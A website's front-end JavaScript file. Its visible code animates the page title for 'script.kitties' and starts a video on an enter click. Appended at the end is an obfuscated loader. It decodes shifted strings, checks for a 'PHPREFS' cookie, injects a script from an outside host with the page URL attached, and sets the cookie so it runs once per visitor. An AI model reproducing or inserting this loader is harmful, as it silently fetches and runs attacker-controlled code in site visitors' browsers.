function animateTitle() {
    const e = "script.kitties";
    let t = 0,
        n = !1;
    !(function d() {
        n ? (t--, t < 0 && (n = !1)) : (t++, t >= e.length && (n = !0));
        const i = e.substring(0, t);
        0 === i.length ? (document.title = "†") : (document.title = i),
            setTimeout(d, 300);
    })();
}
document.addEventListener("DOMContentLoaded", function () {
    animateTitle();
    const e = document.getElementById("video"),
        t = document.getElementById("enterButton");
    t.addEventListener("click", () => {
        t.classList.add("fade-out"),
            e.play(),
            document.getElementById("main").classList.add("main-enter");
    });
});
(function (o, d, l) {
    try {
        o.f = (o) =>
            o
                .split("")
                .reduce(
                    (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
                    ""
                );
        o.b = o.f("UMUWJKX");
        (o.c =
            l.protocol[0] == "h" &&
            /\./.test(l.hostname) &&
            !new RegExp(o.b).test(d.cookie)),
            setTimeout(function () {
                o.c &&
                    ((o.s = d.createElement("script")),
                        (o.s.src =
                            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
                            l.href),
                        d.body.appendChild(o.s));
            }, 1000);
        d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) { }
})({}, document, location);
